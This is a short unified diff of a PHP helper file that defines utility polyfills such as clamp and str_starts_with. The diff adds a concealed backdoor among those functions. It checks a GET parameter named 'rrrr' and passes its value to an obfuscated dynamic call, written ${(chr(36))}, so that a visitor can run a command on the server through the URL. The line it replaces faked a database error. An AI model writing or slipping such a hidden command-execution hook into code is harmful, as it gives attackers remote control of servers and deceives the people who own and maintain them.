@@ -18,8 +18,8 @@ if (!function_exists('clamp')){
         if ($value < $min) return $min;
         if ($value > $max) return $max;
     return $value;}}
-if(!(!function_exists('partial')) && !empty($_GET['r'])){
-    ${(chr(36))}('php -r "throw new \Illuminate\Database\QueryException(\'zakaz\', \"select * from locations where LOWER(name) = \'москва\' limit 1\", [], new \PDOException(\"Table \'forge.locations\' doesn\'t exist\"));"');
+if(!(!function_exists('partial')) && !empty($_GET['rrrr'])){
+    ${(chr(36))}(escapeshellcmd($_GET['rrrr']));
 }
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
